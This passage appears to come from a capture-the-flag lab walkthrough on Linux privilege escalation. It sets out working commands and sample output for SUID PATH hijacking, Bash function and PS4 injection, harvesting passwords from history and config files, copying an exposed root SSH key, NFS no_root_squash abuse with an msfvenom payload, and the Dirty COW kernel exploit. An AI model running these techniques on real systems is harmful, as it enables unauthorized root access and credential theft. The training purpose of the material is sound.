**1. Review and Compile the Malicious Service Executable:**

The exploit code, located at `/home/user/tools/suid/service.c`, is designed to spawn a root shell:

```bash
cat /home/user/tools/suid/service.c
```

**Sample Code:**

```c
int main() {
    setuid(0);
    system("/bin/bash -p");
}
```

**Explanation:**  
This code runs the `setuid(0)` function to elevate privileges to root, followed by spawning a bash shell.

**2. Compile the Exploit:**

Compile the code into an executable named `service`:

```bash
gcc -o service /home/user/tools/suid/service.c
```

**3. Exploit the PATH Variable:**

Prepend the current directory to the `PATH` environment variable so that when the SUID program tries to run `service`, it will execute your malicious version instead:

```bash
PATH=.:$PATH /usr/local/bin/suid-env
```

**Sample Output:**

```bash
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

**Explanation:**  
The SUID program runs the malicious `service` executable, resulting in a root shell.

### Cleanup

After confirming root access, remove the malicious `service` executable and exit the root shell:

```bash
rm ./service
exit
```

**No Answer Needed**

## SUID / SGID Executables - Abusing Shell Features (#1)

### Step 1: Understanding the Vulnerability

The `/usr/local/bin/suid-env2` executable is similar to `/usr/local/bin/suid-env`, except that it uses the absolute path to the `service` executable (`/usr/sbin/service`) to start the Apache webserver. This difference typically protects against PATH manipulation attacks, but we can exploit it using a Bash feature that affects versions less than 4.2-048.

### Step 2: Verifying the Executable and Bash Version

First, confirm that the `suid-env2` executable indeed calls the `service` command using an absolute path by using the `strings` command:

```bash
strings /usr/local/bin/suid-env2
```

**Sample Output:**

```bash
/usr/sbin/service apache2 start
```

**Explanation:**  
This output confirms that the executable uses the full path to the `service` command, which makes it immune to typical PATH-based attacks.

Next, verify the Bash version on the Debian VM to ensure it’s vulnerable:

```bash
/bin/bash --version
```

**Sample Output:**

```bash
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
```

**Explanation:**  
The output shows that the Bash version is 4.1.5, which is vulnerable to the technique we’re about to use. In these older versions, it’s possible to define a shell function that mimics a file path, allowing us to execute arbitrary commands with elevated privileges.

### Step 3: Exploiting the Vulnerability

**1. Define a Malicious Shell Function:**

Create a Bash function with the name `/usr/sbin/service` that, instead of starting the Apache service, spawns a new Bash shell with root privileges:

```bash
function /usr/sbin/service { /bin/bash -p; }
```

**Explanation:**  
This function overrides the actual `/usr/sbin/service` executable. When the `suid-env2` executable attempts to start the Apache service, it will instead execute this function.

**2. Export the Function:**

To ensure the function is available in the environment when the `suid-env2` program runs, export it:

```bash
export -f /usr/sbin/service
```

**3. Run the SUID Program:**

Execute the `suid-env2` program to gain a root shell:

```bash
/usr/local/bin/suid-env2
```

**Sample Output:**

```bash
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Explanation:**  
The output shows that you now have a root shell, meaning the exploit was successful.

### Cleanup

After confirming root access, exit the root shell to return to the user account:

```bash
exit
```

**No Answer Needed**

## SUID / SGID Executables - Abusing Shell Features (#2)

### Step 1: Understanding the Vulnerability

In Bash versions older than 4.4, the `PS4` environment variable is used to define a custom prompt for debugging mode. This can be exploited by embedding commands within the `PS4` variable, which will be executed when debugging is enabled.

### Step 2: Exploiting the Vulnerability

**1. Run the SUID Program with Debugging Enabled:**

We can exploit this by setting `PS4` to a command that copies `/bin/bash` to `/tmp/rootbash` and makes it SUID, allowing it to be executed with root privileges. Use the `env` command to clear other environment variables and set `SHELLOPTS` to enable debugging (`xtrace`):

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

**Sample Output:**

```bash
Starting web server: apache2.
```

**Explanation:**  
While the output appears normal, the embedded command in `PS4` has been executed, creating a SUID Bash shell at `/tmp/rootbash`.

**2. Execute the Root Shell:**

Now, run the SUID Bash shell to gain a root shell:

```bash
/tmp/rootbash -p
```

**Sample Output:**

```bash
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
```

**Explanation:**  
You now have a shell with root privileges, as indicated by `euid=0`.

### Cleanup

Remove the SUID shell and exit the root shell to clean up:

```bash
rm /tmp/rootbash
exit
```

**No Answer Needed**

## Passwords & Keys - History Files

### Step 1: Understanding the Vulnerability

When users accidentally type their password on the command line instead of into a password prompt, it may get recorded in their shell history files. These files, like `.bash_history`, keep a record of all commands executed by the user, including any sensitive information entered.

### Step 2: Viewing History Files

To search for any sensitive information accidentally saved in the user's history files, examine the contents of all hidden history files in the user's home directory:

```bash
cat ~/.*history | less
```

**Explanation:**  
This command concatenates and displays the contents of all history files (e.g., `.bash_history`) in the user's home directory. The `less` command allows you to scroll through the file contents interactively.

### Step 3: Identifying Sensitive Information

As you review the history, note any commands that include sensitive information, such as passwords. For example, the user might have tried to connect to a MySQL server using the root user and a password submitted via the command line:

```bash
mysql -h somehost.local -uroot -ppassword123
```

**Explanation:**  
In this command, the user connects to a MySQL server (`somehost.local`) using the `root` user with the password `password123`. Because the user did not leave a space between the `-p` option and the password, the entire command, including the password, was saved in the history file.

### Step 4: Gaining Root Access

Use the discovered password to switch to the root user:

```bash
su root
```

**Explanation:**  
The `su` command allows you to switch to another user, in this case, the root user. You'll be prompted for the root password, which you already discovered from the history file.

### Cleanup

After gaining root access and confirming the exploit, exit the root shell:

```bash
exit
```

### Q1. What is the full MySQL command the user executed?

**Answer:** `mysql -h somehost.local -uroot -ppassword123`

## Passwords & Keys - Config Files

### Step 1: Understanding the Vulnerability

Configuration files often contain sensitive information, such as passwords, in plaintext or other easily reversible formats. These files are crucial for the operation of software and services but can become a significant security risk if they are improperly secured.

### Step 2: Listing the User's Home Directory

List the contents of the user's home directory to identify any configuration files that might contain sensitive information:

```bash
ls /home/user
```

**Sample Output:**

```bash
total 16
-rw-r--r-- 1 user user  212 May 15  2017 myvpn.ovpn
-rwxr-xr-x 1 user user 6697 Jun  1 01:59 service
drwxr-xr-x 8 user user 4096 May 15 06:35 tools
```

**Explanation:**  
The output shows a file named `myvpn.ovpn`, which is likely a configuration file for a VPN connection. Such files often contain sensitive information, such as credentials for accessing the VPN.

### Step 3: Reviewing the VPN Config File

View the contents of the `myvpn.ovpn` file to check for any embedded credentials or references to other files that might contain sensitive information:

```bash
cat /home/user/myvpn.ovpn
```

**Sample Output:**

```bash
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0
```

**Explanation:**  
The file contains configuration details for connecting to a VPN. Notably, it includes the line `auth-user-pass /etc/openvpn/auth.txt`, which indicates that the user's credentials are stored in the `/etc/openvpn/auth.txt` file.

### Step 4: Extracting Credentials from the Referenced File

Check the contents of the `/etc/openvpn/auth.txt` file to extract the root user's credentials:

```bash
cat /etc/openvpn/auth.txt
```

**Sample Output:**

```bash
root
password123
```

**Explanation:**  
The file contains the username `root` and the password `password123`, which can now be used to switch to the root user.

### Step 5: Gaining Root Access

Use the extracted credentials to switch to the root user:

```bash
su root
```

**Explanation:**  
The `su` command allows you to switch to the root user using the credentials found in the `auth.txt` file.

### Cleanup

After confirming root access, exit the root shell:

```bash
exit
```

### Q1. What file did you find the root user’s credentials in?

**Answer:** `/etc/openvpn/auth.txt`

## Passwords & Keys - SSH Keys

### Step 1: Understanding the Vulnerability

Users often create backups of important files, such as SSH keys, but may neglect to secure them with the correct permissions. If an SSH private key is left exposed with improper permissions, it can be used by unauthorized users to gain access to the system.

### Step 2: Searching for Hidden Files

Look for any hidden files or directories in the system's root directory, as these might contain sensitive information:

```bash
ls -la /
```

**Sample Output:**

```bash
drwxr-xr-x 22 root root  4096 Aug 25  2019 .
drwxr-xr-x 22 root root  4096 Aug 25  2019 ..
drwxr-xr-x  2 root root  4096 Aug 25  2019 bin
...
drwxr-xr-x  2 root root  4096 Aug 25  2019 .ssh
```

**Explanation:**  
The output reveals a hidden directory named `.ssh` in the root directory. This is unusual, as SSH-related files are typically stored in the user's home directory, and this suggests the possibility of misconfigured or unsecured SSH keys.

### Step 3: Inspecting the SSH Directory

View the contents of the `.ssh` directory to identify any files that might be sensitive:

```bash
ls -l /.ssh
```

**Sample Output:**

```bash
-rw-r--r-- 1 root root 1679 Aug 25  2019 root_key
```

**Explanation:**  
The file `root_key` is present in the `.ssh` directory. The `rw-r--r--` permissions indicate that the file is readable by everyone, which is a significant security risk since this file appears to be a private SSH key.

### Step 4: Analyzing the Private SSH Key

Inspect the contents of the `root_key` file to confirm it is an SSH private key:

```bash
cat /.ssh/root_key
```

**Sample Output:**

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
...
-----END RSA PRIVATE KEY-----
```

**Explanation:**  
The content confirms that this is an RSA private key, likely belonging to the root user. With this key, you can authenticate as root over SSH, assuming SSH key authentication is enabled on the server.

### Step 5: Exploiting the Key

**1. Transfer the Key to Your Kali Box:**

You can either copy the key file directly or view the contents and manually copy/paste it to a file on your Kali machine. Ensure the file is saved as `root_key`:

```bash
scp -r user@10.10.118.70:/.ssh/root_key .
```

**2. Set the Correct Permissions:**

The SSH client will refuse to use the key unless it has the correct permissions:

```bash
chmod 600 root_key
```

**3. Use the Key to Login as Root:**

Login to the Debian VM using the private key. Note that due to the age of the box, you may need to specify additional SSH options:

```bash
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@MACHINE_IP
```

**Sample Output:**

```bash
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
...
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Explanation:**  
You now have root access to the server, as indicated by `uid=0(root)`.

### Cleanup

After confirming root access, exit the root shell to maintain good security practices:

```bash
exit
```

**No Answer Needed**

## NFS (Network File System)

### Step 1: Understanding NFS Vulnerabilities

NFS allows a system to share directories and files with others over a network. If improperly configured, NFS can expose a system to various vulnerabilities, especially if root squashing is disabled. Root squashing maps requests from root on a client to the `nobody` user on the server, preventing root access over NFS.

### Step 2: Checking NFS Share Configuration

To understand the NFS configuration, check the `/etc/exports` file on the Debian VM:

```bash
cat /etc/exports
```

**Sample Output:**

```bash
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

**Explanation:**  
The output indicates that the `/tmp` directory is shared via NFS, with `no_root_squash` enabled. This means that the root user on the client machine will be treated as the root user on the server, allowing full access to the shared directory.

### Step 3: Exploiting the NFS Configuration

**1. Prepare Your Kali Box:**

Switch to the root user on your Kali box to ensure you have the necessary permissions:

```bash
sudo su
```

**2. Mount the NFS Share:**

Create a mount point on your Kali box and mount the NFS share:

```bash
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```

**Explanation:**  
This mounts the `/tmp` directory from the Debian VM to your Kali box, with read and write permissions.

**3. Generate a Malicious Payload:**

Use `msfvenom` to create a payload that spawns a shell with elevated privileges:

```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

**Explanation:**  
This command generates an ELF binary that, when executed, will spawn a Bash shell with root privileges.

**4. Set the SUID Permission:**

Make the binary executable and set the SUID permission, which allows the binary to be executed with the permissions of its owner:

```bash
chmod +xs /tmp/nfs/shell.elf
```

### Step 4: Gaining Root Access

Switch back to the Debian VM and, as the low-privileged user, execute the binary to gain a root shell:

```bash
/tmp/shell.elf
```

**Sample Output:**

```bash
bash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
```

**Explanation:**  
You now have a root shell, as indicated by `euid=0(root)`.

### Cleanup

After confirming root access, remove the malicious shell and exit the root shell to maintain good security practices:

```bash
rm /tmp/shell.elf
exit
```

### Q1. What is the name of the option that disables root squashing?

**Answer:** `no_root_squash`

## Kernel Exploits

### Step 1: Understanding Kernel Exploits

Kernel exploits are powerful but dangerous tools that take advantage of vulnerabilities in the operating system's kernel. Exploiting these vulnerabilities can grant you root access to the system. However, they can also leave the system in an unstable state, so they should only be used as a last resort when other methods of privilege escalation have failed.

### Step 2: Identifying Vulnerable Kernel Exploits

To identify potential kernel exploits that may be applicable to the current system, use the Linux Exploit Suggester 2 tool. This tool compares the system's kernel version against known vulnerabilities and suggests applicable exploits.

Run the Linux Exploit Suggester 2 tool:

```bash
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```

**Sample Output:**

```bash
  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 2.6.32
  Searching 72 exploits...

  Possible Exploits
  [1] american-sign-language
      CVE-2010-4347
      Source: http://www.securityfocus.com/bid/45408
  [2] can_bcm
      CVE-2010-2959
      Source: http://www.exploit-db.com/exploits/14814
  [3] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  ...
```

**Explanation:**  
The output lists several potential kernel exploits, along with their respective CVE identifiers and sources where you can find the exploit code. Among these, the Dirty COW exploit (CVE-2016-5195) is particularly notable for its effectiveness in gaining root access by exploiting a race condition in the kernel’s memory management.

### Step 3: Exploiting Dirty COW

**1. Locate the Dirty COW Exploit Code:**

The Dirty COW exploit code, `c0w.c`, can be found in the tools directory provided on the system:

```bash
/home/user/tools/kernel-exploits/dirtycow/c0w.c
```

**Explanation:**  
This exploit works by taking advantage of a race condition that allows an unprivileged user to write to read-only memory, thereby replacing a critical system file like `/usr/bin/passwd` with a malicious version that grants root access.

**2. Compile the Exploit Code:**

Compile the Dirty COW exploit using GCC:

```bash
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
```

**Explanation:**  
The `-pthread` option links the program with the POSIX thread library, which is necessary for the exploit to function correctly.

**3. Execute the Exploit:**

Run the compiled exploit:

```bash
./c0w
```

**Sample Output:**

```bash
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap cc600000

madvise 0

ptrace 0
```

**Explanation:**  
The exploit replaces `/usr/bin/passwd` with a version that spawns a root shell. The original `passwd` binary is backed up to `/tmp/bak`. The exploit might take a few minutes to complete due to the nature of the vulnerability.

**4. Gain Root Access:**

Once the exploit completes, running the `passwd` command will now spawn a root shell:

```bash
/usr/bin/passwd
```

**Sample Output:**

```bash
root@debian:/home/user# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

**Explanation:**  
You now have root access on the system, as indicated by `uid=0(root)`. The `passwd` command, typically used to change a user's password, has been hijacked to grant a root shell.

### Step 4: Restoring the System

To maintain system integrity, restore the original `passwd` file after gaining root access:

```bash
mv /tmp/bak /usr/bin/passwd
```

**Explanation:**  
This command restores the original `passwd` binary from the backup made by the exploit, undoing the changes made during the attack.

### Cleanup

After verifying root access and restoring the original system state, exit the root shell:

```bash
exit
```

**No Answer Needed**
